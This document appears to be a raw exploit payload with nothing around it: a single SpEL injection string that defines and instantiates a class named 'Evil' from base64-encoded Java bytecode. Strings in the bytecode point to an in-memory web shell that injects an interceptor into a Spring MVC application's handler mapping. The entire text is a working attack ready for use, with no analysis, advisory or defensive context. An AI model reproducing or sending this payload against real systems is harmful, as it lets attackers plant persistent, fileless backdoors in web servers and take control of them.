payload=T(org.springframework.cglib.core.ReflectUtils).defineClass('com.example.springmvc.Evil',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAADQA1woAEQB3CgA1AHgIAHkIAHoIAHsIAHwIAH0KAAoAfggAQwcAfwcAgAoACgCBBwCCCACDBwCECgCFAIYHAIcKAIgAiQcAigoAEwCLCgCFAIwHAI0IAI4LABYAjwcAkAcAkQgAkggAVwoACgCTCgCUAIYKAJQAlQcAlgoANQCXCgCYAJkKAJgAmgcAmwgAnAcAnQcAWgkAngCfCgCeAKAKACQAoQoACgCiCgAgAKMIAKQIAKUKABEApggApwcAqAgAqQgAqgoACgCrBwCsAQAGPGluaXQ%2BAQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABxMY29tL2V4YW1wbGUvc3ByaW5nbXZjL0V2aWw7AQAKRXhjZXB0aW9ucwcArQcArgcArwcAsAEACGRvSW5qZWN0AQAYZ2V0V2ViQXBwbGljYXRpb25Db250ZXh0AQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAFlAQAhTGphdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb247AQAcUmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAWYWJzdHJhY3RIYW5kbGVyTWFwcGluZwEAQExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L2hhbmRsZXIvQWJzdHJhY3RIYW5kbGVyTWFwcGluZzsBAB9EZWZhdWx0QW5ub3RhdGlvbkhhbmRsZXJNYXBwaW5nAQAqTG9yZy9zcHJpbmdmcmFtZXdvcmsvYmVhbnMvQmVhbnNFeGNlcHRpb247AQAJY2xhc3NOYW1lAQASTGphdmEvbGFuZy9TdHJpbmc7AQAKY2xhc3NOYW1lMgEAA2I2NAEABWI2NF8yAQATUmVxdWVzdENvbnRleHRVdGlscwEAB2NvbnRleHQBADdMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQ7AQAFZmllbGQBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQATYWRhcHRlZEludGVyY2VwdG9ycwEAFUxqYXZhL3V0aWwvQXJyYXlMaXN0OwEAB2J5dGVzXzIBAAJbQgEAC2NsYXNzTG9hZGVyAQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAJtMQEABWJ5dGVzAQACbTABABZMb2NhbFZhcmlhYmxlVHlwZVRhYmxlAQAUTGphdmEvbGFuZy9DbGFzczwqPjsBAClMamF2YS91dGlsL0FycmF5TGlzdDxMamF2YS9sYW5nL09iamVjdDs%%2FAEAAQQABAEIANwACADgAAANxAAYAEAAAAWsSA0wSBE0SBU4SBjoEEge4AAg6BRkFEgkEvQAKWQMSC1O2AAw6BqcAFzoHGQUSDgS9AApZAxIPU7YADDoGGQYEtgAQGQYBBL0AEVkDuAASwAATtgAUU7YAFcAAFjoHEhe4AAg6CRkHGQm5ABgCAMAAGToIpwAaOgkSG7gACDoKGQcZCrkAGAIAwAAZOggSGRIctgAdOgkZCQS2AB4ZCRkItgAfwAAgOgoqGQS2ACE6C7gAIrYAIzoMEiQSJQe9AApZAxImU1kEEidTWQWyAChTWQayAChTtgAMOg0ZDQS2ABAZDRkMB70AEVkDLFNZBBkLU1kFA7gAKVNZBhkLvrgAKVO2ABVXKi22ACE6DhIkEiUHvQAKWQMSJlNZBBInU1kFsgAoU1kGsgAoU7YADDoPGQ8EtgAQGQ8ZDAe9ABFZAytTWQQZDlNZBQO4AClTWQYZDr64AClTtgAVVxkKGQwrtgAqtgArtgAsV7EAAgAUACYAKQANAF4AcwB2ABoABAA5AAAAfgAfAAAAFQADABYABgAYAAkAGQANABoAFAAdACYAIAApAB4AKwAfAD0AIQBDACMAXgAoAGUAKQBzAC0AdgAqAHgAKwB%2FACwAjQAvAJYAMACcADEAqAA1ALAANwC4ADgA2wA5AOEAOgEGAD4BDQBAATAAQQE2AEIBWwBFAWoARwA6AAAA3gAWACYAAwBDAEQABgArABIARQBGAAcAZQAOAEcASAAJAHMAAwBJAEoACAB%2FAA4ASwBIAAoAeAAVAEUATAAJAAABawA7ADwAAAADAWgATQBOAAEABgFlAE8ATgACAAkBYgBQAE4AAwANAV4AUQBOAAQAFAFXAFIASAAFAD0BLgBDAEQABgBeAQ0AUwBUAAcAjQDeAEkASgAIAJYA1QBVAFYACQCoAMMAVwBYAAoAsAC7AFkAWgALALgAswBbAFwADADbAJAAXQBEAA0BDQBeAF4AWgAOATAAOwBfAEQADwBgAAAAKgAEAGUADgBHAGEACQB%2FAA4ASwBhAAoAFAFXAFIAYQAFAKgAwwBXAGIACgBjAAAATAAE%2FwApAAYHAGQHAGUHAGUHAGUHAGUHAGYAAQcAZ%2FwAEwcAaP8AOAAIBwBkBwBlBwBlBwBlBwBlBwBmBwBoBwBpAAEHAGr8ABYHAGsAPQAAAA4ABgAxAA0APgA%2FAEAAQQABAGwAbQACADgAAAFjAAYABwAAAIkSLbgACE4tEi4DvQAKtgAMOgQZBAEDvQARtgAVOgUZBbYALxIwBL0AClkDEiZTtgAMOgQZBBkFBL0AEVkDK1O2ABU6BRkFwAAnwAAnTacAOk4SMrgACDoEGQQSMwS9AApZAxImU7YANDoFGQUZBLYAKwS9ABFZAytTtgAVOgYZBsAAJ8AAJ00ssAABAAAATQBQADEAAwA5AAAANgANAAAATAAGAE0AEgBOAB4ATwAzAFAARABRAE0AVwBQAFIAUQBTAFgAVABqAFUAfgBWAIcAWAA6AAAAcAALAAYARwBuAEgAAwASADsAbwBEAAQAHgAvAHAAcQAFAE0AAwBeAFoAAgBYAC8AbgBIAAQAagAdAG8ARAAFAH4ACQBwAHEABgBRADYARQByAAMAAACJADsAPAAAAAAAiQBzAE4AAQCHAAIAXgBaAAIAYwAAAA4AAvcAUAcAdPwANgcAJwA9AAAADAAFAA0AQAA%2FADEAPgABAHUAAAACAHY%3D'),new+javax.management.loading.MLet(new+java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance()